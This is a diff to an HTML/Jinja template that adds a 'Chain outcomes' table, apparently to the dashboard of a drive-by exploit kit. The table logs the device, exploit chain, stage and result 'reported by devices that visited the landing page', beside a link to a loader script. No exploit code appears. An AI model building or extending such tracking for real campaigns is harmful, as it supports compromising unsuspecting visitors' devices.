@@ -307,6 +307,28 @@
         <a class="hz-btn hz-btn--sm hz-btn--ghost" href="/loader_26_deploy.js" target="_blank">loader_26_deploy.js</a>
       </div>
     </section>
+
+    <section class="panel">
+      <header><h2>Chain outcomes</h2>
+        <span class="muted" style="font-size:.8rem">reported by devices that visited the landing page</span>
+      </header>
+      <table class="hz">
+        <thead><tr><th>Time</th><th>Device</th><th>Chain</th><th>Stage</th><th>Result</th></tr></thead>
+        <tbody>
+        {% for o in chain_outcomes %}
+          <tr>
+            <td>{{ o.time_h }}</td>
+            <td>{{ o.ua_short }}</td>
+            <td>{{ o.chain }}</td>
+            <td>{{ o.stage }}</td>
+            <td>{{ o.result }}</td>
+          </tr>
+        {% else %}
+          <tr><td colspan="5" class="muted">No chain outcomes yet.</td></tr>
+        {% endfor %}
+        </tbody>
+      </table>
+    </section>
     {% endif %}
   </main>
 </div>
